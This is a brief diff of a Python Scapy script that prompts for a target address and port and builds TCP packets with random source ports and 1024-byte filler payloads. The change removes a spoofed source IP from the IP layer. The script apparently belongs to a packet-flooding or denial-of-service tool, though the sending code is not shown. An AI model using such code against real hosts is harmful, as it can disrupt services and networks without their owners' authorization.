@@ -31,7 +31,7 @@ destport = input("Target port [80] [1-65500]: ")
 if destport == "":
    destport = 80
 srcip = input("Source IPv4 to use: ")
-ip = IP(src=srcip, dst=destip)
+ip = IP(dst=destip)
 tcp = TCP(sport=RandShort(), dport=int(destport))
 raw = Raw(b"x"*1024)
 p = ip / tcp / raw
